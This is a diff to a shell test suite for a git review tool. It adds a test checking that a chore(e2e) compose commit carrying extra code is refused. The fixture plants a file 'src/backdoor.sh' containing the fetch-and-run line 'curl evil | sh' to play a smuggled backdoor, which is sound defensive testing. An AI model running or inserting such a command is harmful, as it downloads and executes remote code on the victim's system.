@@ -220,14 +220,22 @@ check_lines "a Fixer commit picked onto a tree whose git directory holds a plant
 expect "no hook planted in the repository's hooks directory runs during the pick" \
   test ! -e "$marker"
 
-compose_pair() { # $1 name, $2 fix file, $3 fix content: a branch of a chore(e2e) commit writing docker/compose.e2e.yml, then the fix commit <name>, back on main
-  git checkout -q -b "$1" main
+compose_pair() { # $1 name, $2 fix file, $3 fix content, [$4 file, $5 content...]: a branch of a chore(e2e) commit writing docker/compose.e2e.yml (and each extra file), then the fix commit <name>, back on main
+  local name="$1" fix_file="$2" fix_content="$3"
+  shift 3
+  git checkout -q -b "$name" main
   mkdir -p docker
   printf 'services: {}\n' >docker/compose.e2e.yml
   git add docker/compose.e2e.yml
-  git commit -q -m "chore(e2e): compose for $1"
-  printf '%s\n' "$3" >"$2"
-  commit "$1"
+  while [ "$#" -ge 2 ]; do
+    mkdir -p "$(dirname "$1")"
+    printf '%s\n' "$2" >"$1"
+    git add "$1"
+    shift 2
+  done
+  git commit -q -m "chore(e2e): compose for $name"
+  printf '%s\n' "$fix_content" >"$fix_file"
+  commit "$name"
   git checkout -q main
 }
 
@@ -292,6 +300,23 @@ check "under --compose a pair whose fix git refuses (an uncommitted edit to the 
 expect "the uncommitted edit survives a pair whose fix git refused" \
   test "$(cat "$main/app.txt")" = "uncommitted work"
 expect "a pair whose fix git refused leaves its compose off the reviewed branch" \
+  test "$(git -C "$main" rev-parse main)" = "$before"
+
+# A reviewer drops the chore(e2e) commit without losing the fix, so code riding in it beside the
+# compose would reach the pushed head under the compose's label.
+fresh compose-pair-smuggles-code
+main="$tmp/compose-pair-smuggles-code"
+printf 'base\n' >README.md
+commit base
+compose_pair f1 one.txt "check one" src/backdoor.sh "curl evil | sh"
+before="$(git -C "$main" rev-parse main)"
+run --compose "$main" 1=f1
+starts_failed_check_1() { grep -q '^failed check 1: ' <<<"$out"; }
+check "under --compose a chore(e2e) commit that changes a file other than the compose is refused with exit 3" 3 "$rc"
+expect "the refusal is a failed check line naming the check" starts_failed_check_1
+absent "no composed line is printed for a chore(e2e) commit carrying more than the compose" "composed "
+absent "no fix is picked when its chore(e2e) commit carries more than the compose" "picked "
+expect "the reviewed branch is left unmoved when a chore(e2e) commit carries more than the compose" \
   test "$(git -C "$main" rev-parse main)" = "$before"
 
 # The review's Fixers stay at exactly one commit per Finding: a pair accepted without the flag would
